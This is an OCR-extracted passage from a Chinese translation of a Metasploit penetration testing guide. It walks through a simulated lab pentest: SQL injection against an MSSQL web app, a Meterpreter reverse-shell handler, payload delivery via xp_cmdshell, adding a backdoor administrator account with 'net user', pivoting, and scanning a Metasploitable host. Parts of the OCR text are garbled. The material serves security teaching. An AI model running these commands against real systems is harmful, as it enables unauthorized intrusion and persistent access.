息。
错误信息显示出目标Web应用程序中存在着SQL注入漏洞，因为我们看到了一个SQL异
常错误“Incorrect syntaxnear”，而这是由我们输入的'TEST所引起的。仅仅利用我们看到的错
误消息，通过一个快速的Google查询，就可以确定后台数据库是MSSQL。
在这里，我们不会再次深入到如何对Web应用执行SQL注入攻击，实际上你可以轻易地
通过操纵输入参数来攻击一个存在SQL注入漏洞的系统，并最终完全攻陷它。（我们已经在第
11章中简要地覆盖了这一技术)。注意：我们到现在还未真正攻击目标系统，只是简单地尝试
入激动人心的渗透攻击阶段了。
254
---
## Page 282
第17章一次模拟的渗透测试过程
ServerError in'/'Application.
Incorrectsyntaxnear'TEST'
Unclosedquotationmarkafterthe characterstring"
scriptlon:Anunhandec
1.Add a “Debug=true* directive at the top of the file that generated the
or:
2) Add the followving section to the configuration fileof your application
Inportant: Running applications in debug mode does incur
 a memory/performance overhead. You should sake sure that an application has debugging d:
Stack Trace
bject stateObj+186
+800118
SstemDailaaedens
hieMranatal)+31
Systee.DataSqiChent.SqiCommand.Pinishxe
图17-3错误消息反映出存在SQL注入漏洞
17.4渗透攻击
在我们从Web应用程序中搜索漏洞时，发现了一个可以通过SQL注入进行的关键攻击通
道。在这种情况下，Fast-Track是我们来攻陷一台MSSQL服务并在目标系统上植入Merterpreter
的最好选择，因为正如你在第11章已经经历的那样，Fast-Track工具可以轻易地搞定MSSQL
上的注入漏洞。
在我们获得一个Meterpreter终端之后，就可以进一步看看如何通过内网去取得
Metasploitable系统的访问权。
17.5MSF终端中的渗透攻击过程
我们将使用SQLPwnage来通过SQL注入来植入一个Meterpreter终端，以取得目标系统后
台数据库的管理员访问权限。回忆下第11章中我们已经介绍了SQLPwnage是一种攻击MSSQL
注入漏洞的自动化方式，它使用了多种攻击的方法，来利用xp_cmdshell存储过程来完全攻陷
一台SQL服务器。
255
---
## Page 283
Metasploit渗透测试指南
在开始进行攻击之前，我们需要在MSF终端中设置一些配置选项，为了实践更多技术流程，
将手动地创建自己的Metasploit监听器，虽然Fast-Track可以自动地帮你完成这项工作。我们还
将在Metasploit中通过auto_add_route·函数，使我们可以在内部网络中自动连接目标系统。创
建好监听器之后，启动Fast-Track来攻击目标系统。
root@bt:/opt/framework3/msf3#msfconsole
msf > use multi/handler
msf exploit(handler) > set payload windows/meterpreter/reverse_tcp
payload => windows/meterpreter/reverse_tcp
msf exploit(handler) > set LHoST 172.16.32.129
LHOST=> 172.16.32.129
Smsf exploit(handler)> set LPoRT 443
LPORT=>443
0 exploit(handler) > load auto_add_route
[*] Successfully loaded plugin: auto_add_route
msf exploit(handler）>exploit-j
[*] Exploit running as background job.
[*]Started reverse handler on 172.16.32.129:443
[*] Starting the payload handler...
msf exploit(handler)>
我们的监听器在等待马上被攻陷的目标系统来连接时，按照如下方式运行Fast-Track。（当
xterm窗口打开时，马上关闭它，因为我们已经设置好了一个监听器）
[+]Importing 64kb debug bypass payload into Fast-Track...[+]
[+]Importcomplete,formatting thepayload for delivery..[+]
[+]Payload Formatting prepped and ready for launch. [+]
[+]Executing SQl commandsto elevate account permissions.[+]
[+] Initiating stored procedure:'xp_cmdhshell′ if disabled. [+]
[+]Delivery Complete.[+]
Launching MSFCLI Meterpreter Handler
Creating Metasploit Reverse Meterpreter Payload..
Created by msfpayload (http://www.metasploit.com).
Payload: windows/meterpreter/reverse_tcp
Length:290
OptionS:LHOST=172.16.32.129,LPORT=443
Taking raw binary andconverting tohex.
Raw binary converted to straight hex.
[+]Bypassing Windows Debug 64kB Restrictions.Evil.[+]
[+] Sending chunked payload. Number 1 of 9. This may take a bit. [+]
[][]
·.SNIP.··
[+]Conversion from hex to binary in progress.[+]
[+] Conversion complete. Moving the binary to an executable.[+]
[+]Splitting thehex into 1o0character chunks[+]
[+]Split complete.[+]
256
---
## Page 284
第17章一次模拟的渗透测试过程
[+]Prepping the payload for delivery. [+]
Sendingchunk1of8,thismaytakeabit..
Sending chunk 2of 8，this maytakeabit..
...SNIP..·
Using H2B Bypass to convert our Payload to Binary..
Running cleanup before launching the payload....
[+]Launching the PAYLOAD!! This may take up to two or three minutes.[+]
这应该看起来很熟悉，因为已经通过Fast-Track来攻击目标系统上的Web应用程序，并利
用SQL注入漏洞攻陷了主机，我们使用xp_cmdshell存储过程和二进制到十六进制的转换技术
来完成了一个全功能的MeterpreterShell的植入。
17.6后渗透攻击
在这点上，我们应该已经在MSF终端后台中取得了一个Meterpreter控制终端，现在可以
开始扫描目标系统所连接的内部子网，来发现其他活跃的系统。为了完成这一目的，将向受控
目标主机上传nmap，然后在这台Windows靶机上运行它。
首先，从insecure.org网站上下载二进制可执行文件形式的nmap，并保存在本地。我们将
其上传至目标系统上。接下来，将通过微软的RDP协议连接目标系统的远程桌面，RDP是
Windows系统内建支持的一个远程管理协议，使得你能够和Windows桌面进行交互，就好像你
坐在远程机器前进行操作一样。当我们连接到Meterpreter终端会话中后，可以使用Meterpreter
的getgui脚本将RDP协议通过隧道绑定在我们机器上的8080端口，然后在目标系统上添加一
个新的管理员用户。
我们在BackTrack攻击机的命令行上输入rdesktoplocalhost:8080，就可以使用新创建的用
户账号登录到目标系统上。接下来使用Meterpreter上传nmap到目标系统上，目的是在攻陷的
Windows靶机上安装nmap，然后使用这台系统作为攻击跳板，来进行进一步的内网拓展。相反
地，你也可以直接通过Metasploit使用里面集成的scanner/portscan/syn和scanner/portscan/tcp
模块进行扫描，这取决于你自己的喜好和需求。
meterpreter > run getgui -e -f 8080
[*]windows Remote Desktop Configuration Meterpreter Script by Darkoperator
[*] Carlos Perez PI:EMAIL
[*]EnablingRemoteDesktop
[*]RDPisalreadyenabled
[*]Setting Terminal Services service startup mode
[*]TerminalServicesserviceisalreadyset toauto
[*] Opening port in local firewall if necessary
[*] Starting the port forwarding at local port 8080
[*]Local TCP relay created:0.0.0.0:8080127.0.0.1:3389
meterpreter>shell
257
---
## Page 285
Metasploit渗透测试指南
Process 2480 created.
Channel6created.
Microsoft Windows XP[Version 5.1.2600]
(C) Copyright 1985-2001 Microsoft Corp.
C:\WINDowS\system32>net user msf metasploit/add
net user msf metasploit/ADD
The commandcompleted successfully.
C:\WINDowS\system32>net localgroup administrators msf /add
net localgroup administrators msf /add
The command completed successfully.
C:\WINDOWS\system32>
C:\WINDOwS\system32>^Z
Background channel 6? [y/N]  y
meterpreter > upload nmap.exe
[*]uploading : nmap.exe -> nmap.exe
axa'dewu
现在已经准备好进行进一步的攻击了，通过在目标系统上安装nmap，我们好比已经坐到了
目标内部网络中了。现在可以尝试去查点出内部连接的系统，并进一步渗透内部网络了。
17.6.1扫描Metasploitable靶机
通过Meterpreter会话、通过装载auto_add_route命令为我们取得了内部网络的访问通道之
后，我们可以使用攻陷的WindowsXP靶机作为跳板，来扫描和攻击内部网络主机。由于已经
有效地连入了内部网络，所以我们可以直接访问到了Metasploitable靶机目标。让我们首先开始
一个基本的端口扫描。
nmap.exe -sT -A -P0 172.16.32.162
PORT
STATE.SERVICE
VERSION
21/tcp
openftp
ProFTPD 1.3.1
I_ftp-bounce:no banner
22/tcp
open
Ssh
OpenSSH 4.7p1 Debian8ubuntu1(protocol 2.0)
1ssh-hostkey:1024 60:0f:cf:e1:c0:5f:6a:74:d6:90:24:fa:c4:d5:6c:cd (DSA)
[_204856:56:24:0f:21:1d:de:a7:2b:ae:61:b1:24:3d:e8:f3(RSA)
23/tcp
open
telnet
Linux telnetd
25/tcp
open
Smtp
Postfix smtpd
53/tcp
open
domain
ISC BIND 9.4.2
80/tcp
open
http
Apachehttpd2.2.8((Ubuntu)PHP/5.2.4-2ubuntu5.10with Suhosin-Patch)
I_html-title:Site doesn't have a title(text/html).
139/tcp
open
netbios-ssn Samba smbd 3.X (workgroup: WORKGROUP)
445/tcp
open
netbios-Ssn Samba Smbd 3.X(workgroup: WORKGROUP)
3306/tcp open
mysql
MySQL5.0.51a-3ubuntu5
5432/tcp open postgresql PostgreSQL DB
258
---
## Page 286
第17章一次模拟的渗透测试过程
8009/tcpopenajp13
Apache Jserv (Protocol v1.3)
8180/tcp openhttp
Apache Tomcat/Coyote JSP engine 1.1
I_html-title: Apache Tomcat/5.5
I_http-favicon: Apache Tomcat
MAC Address: 00:0C:29:39:12:B2 (VMware)
Network Distance:1hop
Service Info: Host: metasploitable.localdomain; OSs: Unix, Linux
Host script results:
(_nbstat:NetBIOS name:METASPLOITABLE，NetBIOS user:，NetBIOS MAC:
|smb-os-discovery:
OS:Unix (Samba 3.0.20-Debian)
Name:WORKGROUP\Unknown
I_System time: 2010-05-21 22:28:01 UTC-4
Nmap done: 1 IP address (1 host up) scanned in 60.19 seconds
这里可以看到很多端口是开放的。基于nmap的操作系统辨识能力，我们看到扫描的目标
系统是一类UNIX/Linux系统的变种。而其中一些开放的端口，如FTP、Telnet、HTTP、SSH、
Samba、MySQL、PostgresSQL和Apache等应该对你会有很大的吸引力。
17.6.2识别存有漏洞的服务
由于对一些端口非常感兴趣，所以我们首先开始进行旗标撰取，来尝试寻找进入系统的方法：
msf>use auxiliary/scanner/ftp/ftp_version
msfauxiliary(ftp_version)>set RHoSTS172.16.32.162
RHOSTS => 172.16.32.162
msf auxiliary(ftp_version) > run
[*]Scanned 1 of 1hosts(1oo%complete)
[*]Auxiliary module execution completed
msf auxiliary(ftp_version)>
通过对FTP服务的查点，我们看到ProFTPD1.3.1运行在21端口上，接下来使用SSH去
了解更多关于目标系统的信息（额外的-v标志位让我们得到一些调试信息输出），下面的输
出结果显示告诉我们目标系统运行着一个老旧版本的OpenSSH，并是专门为Ubuntu系统所编
写的。
msf>ssh172.16.32.162-V
[*]exec: ssh 172.16.32.162 -v
OpenSSH_5.1p1 Debian-3ubuntu1, OpenSSL 0.9.8g 19 0ct 2007
259
---
## Page 287
Metasploit渗透测试指南
现在我们运行如下指令，来确定目标系统到底运行的是什么版本的Ubuntu。
msf auxiliary(telnet_version)>set RHoSTS 172.16.32.162
RHOSTS => 172.16.32.162
msf auxiliary(telnet_version)>run
[*]172.16.32.162:23 TELNETUbuntu 8.04\x0ametasploitablelogin:
[*]Scanned 1 of 1 hosts (100% complete)
[*]Auxiliary module execution completed
msf auxiliary(telnet_version)>
Great！我们已经知道了自标系统运行看Ubuntu8.04，以及使用了两个未经加密的协议
（telnet和FTP），以后可能会来玩玩它们。
现在让我们看看SMTP，确定下在目标系统上运行着哪个电子邮件服务。记住我们是在探
测在远程的目标服务器上到底运行着哪些版本的网络服务。
msf>use auxiliary/scanner/smtp/smtp_version
msf auxiliary(smtp_version)>set RH0STS172.16.32.162
RHOSTS => 172.16.32.162
msf auxiliary(smtp_version) > run
[*] 172.16.32.162:25 SMTP 220 metasploitable.localdomain ESMTP Postfix (Ubuntu)\xod\x0a
[*]Scanned 1 of 1 hosts(1oo% complete)